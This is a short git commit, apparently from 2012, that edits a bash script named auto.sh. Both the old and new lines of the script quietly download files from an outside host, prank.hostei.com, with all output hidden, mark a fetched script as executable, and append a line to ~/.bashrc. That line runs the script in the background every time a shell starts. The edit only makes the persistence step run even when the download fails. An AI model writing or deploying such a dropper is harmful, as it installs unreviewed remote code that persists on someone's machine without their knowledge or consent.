0d8450a7578ad937f8acc6d8d1d38139b2cdb227
Harsh Singh <hsingh23@illinois.edu>
2012-10-01 17:35:16 -0500

    FINE I'll fix it

--- auto.sh
+++ auto.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-mkdir ~/.config >/dev/null 2>&1; mkdir ~/.config/al >/dev/null 2>&1; ~/.config/al >/dev/null 2>&1; cd ~/.config/al; rm *; wget -r -N -nd http://prank.hostei.com/ >/dev/null 2>&1 && chmod +x al.sh && echo ". ~/.config/al/al.sh & disown $!" >> ~/.bashrc; cd ~
+mkdir ~/.config >/dev/null 2>&1; mkdir ~/.config/al >/dev/null 2>&1; ~/.config/al >/dev/null 2>&1; cd ~/.config/al; rm *; wget -r -N -nd http://prank.hostei.com/ >/dev/null 2>&1 ; chmod +x al.sh ; echo ". ~/.config/al/al.sh & disown $!" >> ~/.bashrc; cd ~
